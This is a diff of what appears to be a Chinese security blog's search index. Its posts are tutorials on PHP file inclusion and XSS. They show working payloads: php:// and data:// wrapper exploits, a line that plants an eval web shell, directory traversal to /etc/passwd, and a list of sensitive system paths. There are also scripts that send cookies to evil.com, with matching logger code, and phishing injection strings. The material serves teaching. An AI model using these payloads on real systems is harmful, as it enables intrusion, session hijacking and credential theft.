+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</span><br><span class="line"></span><br><span class="line">php://filter 目标使用以下的参数作为它路径的一部分。 复合过滤链能够在一个路径上指定。详细使用这些参数可以参考具体范例。</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="left">名称</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>resource=&lt;要过滤的数据流&gt;</code></td>
+<td align="left">这个参数是必须的。它指定了你要筛选过滤的数据流。</td>
+</tr>
+<tr>
+<td align="left"><code>read=&lt;读链的筛选列表&gt;</code></td>
+<td align="left">该参数可选。可以设定一个或多个过滤器名称，以管道符（&#96;</td>
+</tr>
+<tr>
+<td align="left"><code>write=&lt;写链的筛选列表&gt;</code></td>
+<td align="left">该参数可选。可以设定一个或多个过滤器名称，以管道符（&#96;</td>
+</tr>
+<tr>
+<td align="left"><code>&lt;；两个链的筛选列表&gt;</code></td>
+<td align="left">任何没有以 <code>read=</code> 或 <code>write=</code> 作前缀 的筛选器列表会视情况应用于读或写链。</td>
+</tr>
+</tbody></table>
+<p>漏洞代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Exp：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">URL/?file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">php://input 是个可以访问请求的原始数据的只读流。 enctype=&quot;multipart/form-data&quot; 的时候 php://input 是无效的。</span><br></pre></td></tr></table></figure>
+
+<p>用法：?file&#x3D;php:&#x2F;&#x2F;input 数据利用POST传过去。</p>
+<ul>
+<li><strong>读取POST数据</strong></li>
+</ul>
+<p>碰到file_get_contents()就要想到用php:&#x2F;&#x2F;input绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据，具体函数意义下一项；</p>
+<p>代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>写入木马</strong></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>前提：php配置文件中开启 <strong>allow_url_fopen</strong> 和 <strong>allow_url_include</strong>（PHP &lt; 5.3.0）</p>
+<p>就是你POST过去的PHP代码会被执行</p>
+<p>恶意代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>它会生成一个shell.php的一句话木马文件</p>
+<ul>
+<li><strong>命令执行</strong></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>前提：php配置文件中开启 <strong>allow_url_fopen</strong> 和 <strong>allow_url_include</strong>（PHP &lt; 5.3.0）</p>
+<p>恶意代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;whoami&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h3><p>读取本地文件中的内容</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]</span><br><span class="line">	<span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Exp:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/?file=file:///var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+
+<h3 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h3><p>data:数据流封装器。一般遇到 <strong>file_get_contents()</strong> 可以来用</p>
+<p>用法：<code>data://text/plain;base64,</code></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 打印 &quot;I love PHP&quot;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;data://text/plain;base64,SSBsb3ZlIFBIUAo=&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>注意：<code>&lt;span style=&quot;color: rgb(121, 121, 121);&quot;&gt;&lt;?php phpinfo();,这类执行代码最后没有?&gt;&lt;/span&gt;</code>闭合;</p>
+<p>如果php.ini里的allow_url_include&#x3D;On（PHP &lt; 5.3.0）,就可以造成任意代码执行</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>恶意代码</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">url/?filename=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==</span><br></pre></td></tr></table></figure>
+
+<h3 id="phar-x2F-x2F"><a href="#phar-x2F-x2F" class="headerlink" title="phar:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;</h3><p>这是 php 中用来解压打包文件的，不管后缀是什么。</p>
+<p>用法：?file&#x3D;phar: &#x2F;&#x2F;压缩包&#x2F;内部文件 phar:&#x2F;&#x2F;xxx.png&#x2F;shell.php </p>
+<p>注意： PHP &gt; &#x3D;5.3.0 压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。 </p>
+<p>步骤： 写一个一句话木马文件shell.php，然后用zip协议压缩为shell.zip，然后将后缀改为png等其他格式。</p>
+<p><strong>Exp：</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">url/index.php?filename=phar://shell.png/shell.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="zip-x2F-x2F"><a href="#zip-x2F-x2F" class="headerlink" title="zip:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;</h3><p>zip 伪协议和 phar 协议类似，但是用法不一样。</p>
+<p>用法：?file&#x3D;zip:&#x2F;&#x2F;[压缩文件绝对路径]#[压缩文件内的子文件名] zip:&#x2F;&#x2F;xxx.png#shell.php。</p>
+<p>前提： <strong>PHP &gt; &#x3D;5.3.0</strong></p>
+<p>注意：在windows下测试要5.3.0&lt;PHP&lt;5.4 才可以 <strong>#</strong> 在浏览器中要编码为%23，否则浏览器默认不会传输特殊字符。</p>
+<p><strong>Exp：</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">url/index.php?filename=zip://shell.png%23shell.php</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <categories>
-        <category>服务器</category>
+        <category>web渗透</category>
       </categories>
       <tags>
-        <tag>内网穿透</tag>
-        <tag>虚拟机</tag>
-        <tag>服务器</tag>
+        <tag>web</tag>
       </tags>
   </entry>
   <entry>
@@ -766,96 +1094,6 @@
       </categories>
       <tags>
         <tag>Misc</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>跨站脚本攻击XSS</title>
-    <url>/2022/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BBXSS/</url>
-    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>跨站脚本攻击（Cross-site scripting，XSS）是一种安全漏洞，攻击者可以利用这种漏洞在网站上注入恶意的客户端代码。当被攻击者登陆网站时就会自动运行这些恶意代码，从而，攻击者可以突破网站的访问权限，冒充受害者。还可以对受害者采取Cookies资料窃取、会话劫持、钓鱼欺骗等各种攻击。</p>
-<span id="more"></span>
-
-<h1 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h1><h2 id="存储型-XSS（持久型）"><a href="#存储型-XSS（持久型）" class="headerlink" title="存储型 XSS（持久型）"></a><strong>存储型 XSS（持久型）</strong></h2><hr>
-<p>注入型脚本永久存储在目标服务器上。当浏览器请求数据时，脚本从服务器上传回并执行。</p>
-<p>这类 XSS 不需要用户点击特定 URL 就能执行跨站脚本，攻击者早就上传恶意代码或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。</p>
-<p><img src="/2022/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BBXSS/image-20220316233332570.png"></p>
-<h2 id="反射型-XSS（非持久型）"><a href="#反射型-XSS（非持久型）" class="headerlink" title="反射型 XSS（非持久型）"></a><strong>反射型 XSS（非持久型）</strong></h2><hr>
-<p>攻击者将恶意代码附加到URL参数中，当用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。Web服务器将注入脚本，比如一个错误信息，搜索结果等 返回到用户的浏览器上。由于浏览器认为这个响应来自”可信任”的服务器，所以会执行这段脚本。通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。</p>
-<p><img src="/2022/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BBXSS/image-20220316233924916.png"></p>
-<h2 id="基于-DOM-的-XSS"><a href="#基于-DOM-的-XSS" class="headerlink" title="基于 DOM 的 XSS"></a><strong>基于 DOM 的 XSS</strong></h2><hr>
-<p> DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞。通过修改原始的客户端代码，受害者浏览器的 DOM 环境改变，导致有效载荷的执行。也就是说，页面本身并没有变化，但由于DOM环境被恶意修改，有客户端代码被包含进了页面，并且意外执行。</p>
-<h1 id="XSS利用"><a href="#XSS利用" class="headerlink" title="XSS利用"></a>XSS利用</h1><hr>
-<h2 id="Cookies利用"><a href="#Cookies利用" class="headerlink" title="Cookies利用"></a>Cookies利用</h2><hr>
-<p>攻击者使用使用代码获取客户端的Cookies信息：</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">&quot;http://www.evil.com/cookie.asp?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Image</span>().<span class="property">src</span>=<span class="string">&quot;http://www.evil.com/cookie.asp?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://www.evil.com/cookie.asp?cookie=&quot;</span>+<span class="attr">document.cookie</span>&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
-
-<p>在攻击者远程服务器上，有一个接受和记录Cookies信息的文件，</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">  msg=Request.ServerVariables(&quot;QUERY_STRING&quot;)</span><br><span class="line">  testfile=Server.MapPath(&quot;cookie.txt&quot;)</span><br><span class="line">  set fs=server.CreateObject(&quot;Scripting.filesystemobject&quot;)</span><br><span class="line">  set thisfile=fs.OpenTextFile(testfile,8,True,0)</span><br><span class="line">  thisfile.Writeline(&quot;&quot;&amp;msg&amp; &quot;&quot;)</span><br><span class="line">  thisfile.close</span><br><span class="line">  set fs=nothing</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;cookie.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>, <span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>攻击者在获取到Cookies之后，通过修改访问浏览器的Cookies，以达到伪造用户登录。</p>
-<h2 id="会话劫持"><a href="#会话劫持" class="headerlink" title="会话劫持"></a>会话劫持</h2><hr>
-<p>由于使用 Cookies 存在一定的安全缺陷，因此，开发者开始使用一些更为安全的认证方式，如 Session。在 Session 机制中，客户端和服务端通过标识符来识别用户身份和维持会话，但这个标识符也有被其他人利用的可能。会话劫持的本质是在攻击中带上了 Cookies 并发送到了服务端。</p>
-<p>如某 CMS 的留言系统存在一个存储型 XSS 漏洞，攻击者把 XSS 代码写进留言信息中，当管理员登录后台并查看是，便会触发 XSS 漏洞，由于 XSS 是在后台触发的，所以攻击的对象是管理员，通过注入 JavaScript 代码，攻击者便可以劫持管理员会话执行某些操作，从而达到提升权限的目的。</p>
-<p>比如，攻击者想利用 XSS 添加一个管理员账号，只需要通过之前的代码审计或其他方式，截取到添加管理员账号时的 HTTP 请求信息，然后使用 XML HTTP 对象在后台发送一个 HTTP 请求即可，由于请求带上了被攻击者的 Cookies，并一同发送到服务端，即可实现添加一个管理员账户的操作。</p>
-<h2 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h2><hr>
-<ul>
-<li><strong>重定向钓鱼</strong></li>
-</ul>
-<p>将当前访问重定向到一个钓鱼网页</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//www.bug.com/index.php?search=&quot;&#x27;&gt;&lt;script&gt;document.location.href=&quot;http://www.evil.com&quot;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>HTML注入式钓鱼</strong></li>
-</ul>
-<p>利用XSS漏洞注入HTML或JavaScript代码到页面中</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//www.bug.com/index.php?search=&quot;&#x27;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;login&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div style=&quot;text-align:center;&quot;&gt;&lt;form Method=&quot;POST&quot; Action=&quot;phishing.php&quot; Name=&quot;form&quot;&gt;&lt;br /&gt;&lt;br /&gt;Login:&lt;br/&gt;&lt;input name=&quot;login&quot; /&gt;&lt;br /&gt;Password:&lt;br/&gt;&lt;input name=&quot;Password&quot; type=&quot;password&quot; /&gt;&lt;br/&gt;&lt;br/&gt;&lt;input name=&quot;Valid&quot; value=&quot;Ok&quot; type=&quot;submit&quot; /&gt;&lt;br/&gt;&lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>iframe钓鱼</strong></li>
-</ul>
-<p>通过<code>&lt;iframe&gt;</code>标签嵌入远程域的一个页面实施钓鱼</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.bug.com/index.php?search=&#x27;&gt;&lt;iframe src=&quot;http://www.evil.com&quot; height=&quot;100%&quot; width=&quot;100%&quot;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>Flash钓鱼</strong></li>
-</ul>
-<p>将构造好的 <strong>Flash</strong> 文件传入服务器，在目标网站用 <code>&lt;object&gt;</code> 或 <code>&lt;embed&gt;</code> 标签引用即可。</p>
-<ul>
-<li><p>高级钓鱼技术</p>
-<p>注入代码劫持 HTML 表单、使用 JavaScript 编写键盘记录器等。</p>
-</li>
-</ul>
-<h2 id="网页上马"><a href="#网页上马" class="headerlink" title="网页上马"></a>网页上马</h2><hr>
-<p>通过篡改网页的方式，如在 <strong>XSS</strong> 中使用 <code>&lt;iframe&gt;</code> 标签。</p>
-<h2 id="DOS与DDOS"><a href="#DOS与DDOS" class="headerlink" title="DOS与DDOS"></a>DOS与DDOS</h2><hr>
-<p>通过注入恶意<strong>Javascript</strong>代码，导致拒绝服务攻击</p>
-<h2 id="XSS-蠕虫"><a href="#XSS-蠕虫" class="headerlink" title="XSS 蠕虫"></a>XSS 蠕虫</h2><hr>
-<p>通过精心构造的 <strong>XSS</strong> 代码，可以实现非法转账、篡改信息、删除文章、自我复制等诸多功能。</p>
-<h1 id="XSS绕过WAF"><a href="#XSS绕过WAF" class="headerlink" title="XSS绕过WAF"></a>XSS绕过WAF</h1><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><ul>
-<li><strong>HTML实体编码</strong></li>
-</ul>
-<p>命名规则：以&amp;开头，分号结尾。&lt; &#x3D; <code>&amp;1t</code></p>
-<p>字符编码</p>
-<p>十进制，十六进制的ASCII码或者Unicode字符编码。如<code>&amp;#数值</code>;</p>
-<p>如 &lt; 的编码为：<code>&amp;#60</code>、<code>&amp;#x003c</code></p>
-<ul>
-<li><strong>URL编码</strong></li>
-</ul>
-<p>两次URL全编码</p>
-<ul>
-<li><strong><code>String.fromCharCode</code>编码</strong></li>
-</ul>
-<p>alert的编码为<code>String.fromCharCode</code>(97,108,101,114,116)</p>
-<p>XSS绕过也可以看看该文章：<a href="https://blog.csdn.net/weixin_50464560/article/details/114491500">XSS过滤绕过速查表</a></p>
-<hr>
-<p><strong>先记录到这里，以后有补充还会更新的</strong></p>
-]]></content>
-      <categories>
-        <category>web渗透</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
       </tags>
   </entry>
   <entry>
@@ -1290,273 +1528,87 @@
       </tags>
   </entry>
   <entry>
-    <title>文件包含漏洞</title>
-    <url>/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>文件包含是指会在单个文件写入需要重复使用的函数，在需要使用的时候就直接调用此文件，这种文件调用的过程一般被称为文件包含。文件包含分为本地文件包含和远程文件包含，说明如下：</p>
-<ul>
-<li>当被包含的文件在服务器本地时，称为本地文件包含。</li>
-<li>当被包含的文件在第三方服务器时，称为远程文件包含。</li>
-</ul>
+    <title>跨站脚本攻击XSS</title>
+    <url>/2022/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BBXSS/</url>
+    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>跨站脚本攻击（Cross-site scripting，XSS）是一种安全漏洞，攻击者可以利用这种漏洞在网站上注入恶意的客户端代码。当被攻击者登陆网站时就会自动运行这些恶意代码，从而，攻击者可以突破网站的访问权限，冒充受害者。还可以对受害者采取Cookies资料窃取、会话劫持、钓鱼欺骗等各种攻击。</p>
 <span id="more"></span>
 
-<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>由于开发人员没对文件名设置严格的规则，和其服务器上的没有过滤掉这些恶意文件，导致带有恶意代码的文件进入被包含进服务器中，从而形成了文件包含漏洞。</p>
-<h2 id="PHP中引发漏洞的函数"><a href="#PHP中引发漏洞的函数" class="headerlink" title="PHP中引发漏洞的函数"></a>PHP中引发漏洞的函数</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(): 表达式包含并运行指定文件</span><br><span class="line"><span class="keyword">include_once</span>(): 表达式包含并运行指定重复运行的文件</span><br><span class="line"><span class="keyword">require</span>():</span><br><span class="line"><span class="keyword">require_once</span>(): PHP会检查该文件是否已经被包含过，如果是则不会再次包含。</span><br></pre></td></tr></table></figure>
+<h1 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h1><h2 id="存储型-XSS（持久型）"><a href="#存储型-XSS（持久型）" class="headerlink" title="存储型 XSS（持久型）"></a><strong>存储型 XSS（持久型）</strong></h2><hr>
+<p>注入型脚本永久存储在目标服务器上。当浏览器请求数据时，脚本从服务器上传回并执行。</p>
+<p>这类 XSS 不需要用户点击特定 URL 就能执行跨站脚本，攻击者早就上传恶意代码或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。</p>
+<p><img src="/2022/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BBXSS/image-20220316233332570.png"></p>
+<h2 id="反射型-XSS（非持久型）"><a href="#反射型-XSS（非持久型）" class="headerlink" title="反射型 XSS（非持久型）"></a><strong>反射型 XSS（非持久型）</strong></h2><hr>
+<p>攻击者将恶意代码附加到URL参数中，当用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。Web服务器将注入脚本，比如一个错误信息，搜索结果等 返回到用户的浏览器上。由于浏览器认为这个响应来自”可信任”的服务器，所以会执行这段脚本。通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。</p>
+<p><img src="/2022/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BBXSS/image-20220316233924916.png"></p>
+<h2 id="基于-DOM-的-XSS"><a href="#基于-DOM-的-XSS" class="headerlink" title="基于 DOM 的 XSS"></a><strong>基于 DOM 的 XSS</strong></h2><hr>
+<p> DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞。通过修改原始的客户端代码，受害者浏览器的 DOM 环境改变，导致有效载荷的执行。也就是说，页面本身并没有变化，但由于DOM环境被恶意修改，有客户端代码被包含进了页面，并且意外执行。</p>
+<h1 id="XSS利用"><a href="#XSS利用" class="headerlink" title="XSS利用"></a>XSS利用</h1><hr>
+<h2 id="Cookies利用"><a href="#Cookies利用" class="headerlink" title="Cookies利用"></a>Cookies利用</h2><hr>
+<p>攻击者使用使用代码获取客户端的Cookies信息：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">&quot;http://www.evil.com/cookie.asp?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Image</span>().<span class="property">src</span>=<span class="string">&quot;http://www.evil.com/cookie.asp?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://www.evil.com/cookie.asp?cookie=&quot;</span>+<span class="attr">document.cookie</span>&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
 
-<p>include() 函数在包含中出现错误，会警告一次，但是代码会继续运行，require() 函数它与 include 函数几乎一样，区别是它运行错误就会中止脚本。</p>
-<h1 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h1><h2 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞"></a>本地文件包含漏洞</h2><p><strong>类似代码</strong></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在攻击者远程服务器上，有一个接受和记录Cookies信息的文件，</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">  msg=Request.ServerVariables(&quot;QUERY_STRING&quot;)</span><br><span class="line">  testfile=Server.MapPath(&quot;cookie.txt&quot;)</span><br><span class="line">  set fs=server.CreateObject(&quot;Scripting.filesystemobject&quot;)</span><br><span class="line">  set thisfile=fs.OpenTextFile(testfile,8,True,0)</span><br><span class="line">  thisfile.Writeline(&quot;&quot;&amp;msg&amp; &quot;&quot;)</span><br><span class="line">  thisfile.close</span><br><span class="line">  set fs=nothing</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
 
-<h3 id="读取敏感信息"><a href="#读取敏感信息" class="headerlink" title="读取敏感信息"></a><strong>读取敏感信息</strong></h3><p>本地无限制读取，服务器没有过滤敏感信息。</p>
-<p><strong>Exp:</strong></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">url/flie.php?filename=../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;cookie.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>, <span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>常见敏感信息路径：路径也可能因为版本的更新而更改</p>
-<table>
-<thead>
-<tr>
-<th>Windows系统路径</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>c:\boot.ini</td>
-<td>查看系统版本</td>
-</tr>
-<tr>
-<td>c:\windows\system32\inetsrv\MetaBase.xml</td>
-<td>IIS配置文件</td>
-</tr>
-<tr>
-<td>c:\windows\repair\sam</td>
-<td>存储Windows系统初次安装的密码</td>
-</tr>
-<tr>
-<td>c:\ProgramFiles\mysql\my.ini</td>
-<td>MySQL配置</td>
-</tr>
-<tr>
-<td>c:\ProgramFiles\mysql\data\mysql\user.MYD</td>
-<td>MySQL root密码</td>
-</tr>
-<tr>
-<td>windows系统</td>
-<td>php 配置信息</td>
-</tr>
-</tbody></table>
-<table>
-<thead>
-<tr>
-<th>Linux&#x2F;Unix系统路径</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>&#x2F;etc&#x2F;passwd</td>
-<td>账户信息</td>
-</tr>
-<tr>
-<td>&#x2F;etc&#x2F;shadow</td>
-<td>账户密码文件</td>
-</tr>
-<tr>
-<td>&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf</td>
-<td>Apache2默认配置文件</td>
-</tr>
-<tr>
-<td>&#x2F;etc&#x2F;passwd &#x2F;&#x2F; 账户信息</td>
-<td>虚拟网站配置</td>
-</tr>
-<tr>
-<td>&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini</td>
-<td>PHP相关配置</td>
-</tr>
-<tr>
